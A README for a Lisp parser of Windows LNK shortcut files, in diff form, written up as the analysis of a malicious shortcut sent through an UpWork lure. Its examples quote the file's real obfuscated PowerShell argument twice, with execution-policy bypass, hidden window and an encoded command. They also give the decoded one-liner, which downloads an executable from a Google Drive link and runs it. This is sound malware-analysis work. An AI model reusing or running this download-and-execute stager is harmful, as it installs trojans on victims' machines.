@@ -1,0 +1,103 @@
+
+# Table of Contents
+
+1.  [Background](#orgf455823)
+2.  [Working with LISP Investigating Infected LNK File](#orga46f141)
+3.  [Quick Simple Report](#org945b9b5)
+
+MS LNK binary file parser written in LISP.
+
+
+<a id="orgf455823"></a>
+
+# Background
+
+A friend of mine was asked to review an article from a legitimate user on UpWork. A "link" to the article was provided in a password protected Zip file. After she typed in the password to open the link, a message came up that said the file was corrupt and could not be opened. Within the hour, UpWork sent her an email indicating that she had potentially compromised her computer.
+
+The file in question was a Microsoft LNK file, which is a binary file ostensibly containing shortcut information. In this case, the LNK file contained a command to download an executable from Google drive and execute it on the system. My subsequent research identified the executable as a Trojan, most likely a modification of the Nymeria virus.
+
+I couldn't find a good tool to look at the contents of a LNK file. Many tools, like Jacob Cunningham's lnk-parser and a few derivatives of his work, are outdated. However, Microsoft publicly publishes the specification in their publication "[MS-SHLLNK]: Shell Link (.LNK) Binary Format<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>" The specification is fairly well written and easy to understand.
+
+
+<a id="orga46f141"></a>
+
+# Working with LISP Investigating Infected LNK File
+
+I had been looking for an opportunity to explore quick prototyping with LISP. The interactive REPL combined with the Emacs SLIME mode proved to be a useful combination to explore the binary file. I enjoyed the few hours I spent working on this.
+
+The Perl script I tried decoded some of the file, and through that, I knew that the LNK file was running MS PowerShell, but the specific command was encoded. I was most interested in determining the actual command, so I did not implement the entire specification into this parser. In the interest of prototyping, I also didn't worry too much about what the best long term structures would be to hold certain pieces of information. If I need this tool more than once, then maybe I'll spend some time cleaning it up.
+
+First, I decided to read the entire file into an integer array. The array is small and I could read it in once and play around with different sections. I then wrote a few utility functions to facilitate my exploration; a function to split chunks of the array out, convert certain chunks of the integer array into a single number (by least or most significant bit ordering), converting lists of integers to strings, and a rudimentary Base 64 decoding from a list of integers.
+
+    (in-package lnk-parser)
+    (defparameter *lnk* (get-byte-array "./testing/articlesample.lnk"))
+
+    *LNK*
+
+    (get-integer-from-bytes (get-byte-chunk 0 2 *lnk*))
+
+    76
+
+    (format t "~8,'0x-~4,'0x-~4,'0x-~4,'0x-~12,'0x~%" 
+            (get-integer-from-bytes (get-byte-chunk 4 4 *lnk*) :order 'lsf)
+            (get-integer-from-bytes (get-byte-chunk 8 2 *lnk*) :order 'msf)
+            (get-integer-from-bytes (get-byte-chunk 10 2 *lnk*) :order 'msf)
+            (get-integer-from-bytes (get-byte-chunk 12 2 *lnk*) :order 'msf)
+            (get-integer-from-bytes (get-byte-chunk 14 6 *lnk*) :order 'msf))
+
+    00021401-0000-0000-C000-000000000046
+
+Getting the LNK file times was interesting. Windows uses an LDAP time-stamp, which is the number of 100 nanosecond chunks since January 1, 1601. LISP uses an epoch of January 1, 1900. All of this was odd to me, being used to primarily the UNIX epoch.
+
+I deciphered most of the LNK file header, with the exception of the hot key flags. I also didn't do much with the icon index.
+
+After deciphering the header, I wrote a few functions to skip me to the string data section, the section that I was really interested in. With the utility functions ironed out, getting the string data required just a handful of lines. 
+
+    (get-string-data *lnk*)
+
+    ((HASICONLOCATION . "C:\\Windows\\system32\\imageres.dll")
+     (HASARGUMENTS
+      . "cMd /c   PoweRshELL.EXe  -eX	BYpAsS 			-W	hiDdeN 		-ec	CQAMAAkAKAAJAAsACQBuAGUAVwAtAG8AQgBKAEUAYwB0ACAACwAgAFMAWQBzAHQAZQBtAC4AbgBlAFQALgBXAGUAYgBDAEwASQBlAG4AdAAJACAACQApAC4ARABPAHcATgBsAE8AYQBkAGYASQBMAEUAKAAJAAkACQAdIGgAdAB0AHAAcwA6AC8ALwBkAHIAaQB2AGUALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AdQBjAD8AZQB4AHAAbwByAHQAPQBkAG8AdwBuAGwAbwBhAGQAJgBpAGQAPQAxADkAZgBmAHcAYQBEAFMAQwBYAEgAQgBnAFMATQBMADgAagBqAE4AWAB0AF8ASgA2AHgASgBpADYAVgBNAFgAawAdIAkACwAgACwACQAgAAkAHSAkAEUATgB2ADoAdABFAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIAkACwAJACkACQAgAAkAOwAgAAwACQBJAG4AVgBPAEsAZQAtAEkAdABFAE0AIAAJACAAHSAkAEUATgBWADoAVABlAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIA==	 ")
+     (HASRELATIVEPATH
+      . "..\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
+
+The outdated Perl script did not return the entire string, clipping off most of the text behind "-ec", which is short for "-EncodedCommand", a way to send Base 64 text encoding. LISP has some good libraries that deal with Base 64 encoding and decoding, but this was a short exploratory exercise, and a LISP learning experience for me. I wrote a very basic function to look for "-ec" and then process the string immediately following, using a rudimentary Base 64 decoder.
+
+    (get-cmd-argsb64 (cdr (assoc 'HasArguments (get-string-data *lnk*))))
+
+    "		(		neW-oBJEct  SYstem.neT.WebCLIent	 	).DOwNlOadfILE(			”https://drive.google.com/uc?export=download&id=19ffwaDSCXHBgSML8jjNXt_J6xJi6VMXk”	 ,	 	”$ENv:tEmP\\dmasddc.exe”		)	 	; 	InVOKe-ItEM 	 ”$ENV:TemP\\dmasddc.exe”"
+
+Here we have it! The LNK file is downloading an executable from Goggle Drive, renaming it to dmasddc.exe and running it. 
+
+It took only a few days for Google to block downloading of the executable file, after I flagged the file. he file is still there, but only down-loadable by the author; the Google drive error is "Sorry, this file is infected with a virus. Only the owner is allowed to download infected files." The original Zip file that contains the LNK file was also flagged, but it has not been blocked.
+
+
+<a id="org945b9b5"></a>
+
+# Quick Simple Report
+
+To just see a simple report, you can use the function "report-lnk-file-information", which takes the path to the file name as the only argument. For more in-depth investigating or forensics, you will need to use some of the lower level functions.
+
+    (report-lnk-file-information "./testing/articlesample.lnk")
+
+    LNK File: ./testing/articlesample.lnk
+      Creation Time: 2016-03-19 17:05:21 GMC+5 DST
+      Last Access Time: 2016-03-19 17:05:21 GMC+5 DST
+      Last Modify Time: 2014-10-28 21:37:04 GMC+5 DST
+      Target File Size: 449K
+      Show Command Flag: SHOWMINNOACTIVE
+      Hot Key hex flags: (0 0)
+      Link Flags: (HASLINKTARGETIDLIST HASLINKINFO HASRELATIVEPATH HASARGUMENTS
+                   HASICONLOCATION ISUNICODE DISABLEKNOWNFOLDERALIAS)
+      File Attributes Flags: (ARCHIVE)
+      String Data: 
+        HASICONLOCATION: C:\Windows\system32\imageres.dll
+        HASARGUMENTS: cMd /c   PoweRshELL.EXe  -eX	BYpAsS 			-W	hiDdeN 		-ec	CQAMAAkAKAAJAAsACQBuAGUAVwAtAG8AQgBKAEUAYwB0ACAACwAgAFMAWQBzAHQAZQBtAC4AbgBlAFQALgBXAGUAYgBDAEwASQBlAG4AdAAJACAACQApAC4ARABPAHcATgBsAE8AYQBkAGYASQBMAEUAKAAJAAkACQAdIGgAdAB0AHAAcwA6AC8ALwBkAHIAaQB2AGUALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AdQBjAD8AZQB4AHAAbwByAHQAPQBkAG8AdwBuAGwAbwBhAGQAJgBpAGQAPQAxADkAZgBmAHcAYQBEAFMAQwBYAEgAQgBnAFMATQBMADgAagBqAE4AWAB0AF8ASgA2AHgASgBpADYAVgBNAFgAawAdIAkACwAgACwACQAgAAkAHSAkAEUATgB2ADoAdABFAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIAkACwAJACkACQAgAAkAOwAgAAwACQBJAG4AVgBPAEsAZQAtAEkAdABFAE0AIAAJACAAHSAkAEUATgBWADoAVABlAG0AUABcAGQAbQBhAHMAZABkAGMALgBlAHgAZQAdIA==	 
+          Base64 translation of command after -ec
+            		(		neW-oBJEct  SYstem.neT.WebCLIent	 	).DOwNlOadfILE(			”https://drive.google.com/uc?export=download&id=19ffwaDSCXHBgSML8jjNXt_J6xJi6VMXk”	 ,	 	”$ENv:tEmP\dmasddc.exe”		)	 	; 	InVOKe-ItEM 	 ”$ENV:TemP\dmasddc.exe”
+        HASRELATIVEPATH: ..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+
+# Footnotes
+
+<sup><a id="fn.1" href="#fnr.1">1</a></sup> MS-SHLLINK Specification, Version 5.0 2018-09-12, retrieved 2019-03-25. Website [ms-shllnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink). PDF version 5.0 [ms-shllnk-v5.0.pdf](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SHLLINK/%5bMS-SHLLINK%5d.pdf).
